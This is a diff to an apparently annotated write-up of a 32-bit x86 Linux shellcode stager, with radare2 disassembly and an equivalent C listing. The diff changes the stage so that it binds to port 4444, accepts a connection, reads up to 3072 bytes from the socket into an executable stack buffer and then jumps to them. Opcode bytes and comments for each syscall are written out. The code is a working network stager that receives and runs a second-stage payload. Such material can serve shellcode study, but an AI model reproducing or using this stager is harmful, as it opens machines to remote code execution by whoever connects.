@@ -20,7 +20,7 @@ $ r2 -a x86 -b 32 -c 'pd' stage1.bin
 
             0x00000014      31db           xor ebx, ebx        ; ebx = 0
             0x00000016      f7e3           mul ebx             ; eax = 0, edx = 0
-            0x00000018      53             push ebx            ; protocol = 0               00000000<
+            0x00000018      53             push ebx            ; protocol = IPPROTO_IP(0)   00000000<
             0x00000019      43             inc ebx             ; call = SYS_SOCKET
             0x0000001a      53             push ebx            ; type = SOCK_STREAM(1)      00000000|00000001<
             0x0000001b      6a02           push 2              ; domain = AF_INET(2)        00000000|00000001|00000002<
@@ -64,13 +64,13 @@ $ r2 -a x86 -b 32 -c 'pd' stage1.bin
             0x00000055      50             push eax            ;                            00000000|00000000|5c110002|00000010|ffffdff4|[sockfd]|00000000<
             0x00000056      43             inc ebx             ; call = SYS_ACCEPT(5)
             0x00000057      b066           mov al, 0x66        ; syscall #102: int socketcall(int call, unsigned long *args) || int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
-            0x00000059      895104         mov dword [ecx + 4], edx                         00000000|00000000|5c110002|00000000|ffffdff4|[sockfd]<
+            0x00000059      895104         mov dword [ecx + 4], edx                         00000000|00000000|5c110002|00000010|ffffdff4|[sockfd]<
             0x0000005c      cd80           int 0x80        !!! ; accept(sockfd, 0xffffdff4, 0x10)
 
             0x0000005e      93             xchg eax, ebx       ; eax = 5, ebx = [sockfd_] (of the accepted socket)
-            0x0000005f      b60c           mov dh, 0xc         ; edx = 12
-            0x00000061      b003           mov al, 3           ; syscall #3: pid_t fork(void);
-            0x00000063      cd80           int 0x80        !!! ; fork()
+            0x0000005f      b60c           mov dh, 0xc         ; edx = 3072
+            0x00000061      b003           mov al, 3           ; syscall #3: ssize_t read(int fd, void *buf, size_t count);
+            0x00000063      cd80           int 0x80        !!! ; read(sockfd, ecx, 3072)
 
             0x00000065      87df           xchg edi, ebx       ; edi = [sockfd_], ebx = 0x00000000
             0x00000067      5b             pop ebx             ; ebx = 0x00000000           00000000|00000000|5c110002|00000010|ffffdff4|[sockfd]<
@@ -98,11 +98,12 @@ int main(int argc, char* argv[]) {
         uint32_t esp;
         int sockfd;
         int optlen;
+        struct sockaddr_in addr;
 
         asm("mov %%esp, %0" : "=r" (esp));
         mprotect(esp&0xfffff000, 4096, PROT_READ|PROT_WRITE|PROT_EXEC);
 
-        sockfd = socket(AF_INET, SOCK_STREAM, 0);
+        sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
 
         optlen = 4;
         setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optlen, optlen);
@@ -113,10 +114,10 @@ int main(int argc, char* argv[]) {
         bind(sockfd, (struct sockaddr *) &addr, 16);
 
         listen(sockfd, esp);
-
         accept(sockfd, &addr, 16);
+        read(sockfd, (char*)&addr, 3072);
 
-        fork();
+        ((void(*)(void))&addr)();
 
         return 0;
 }
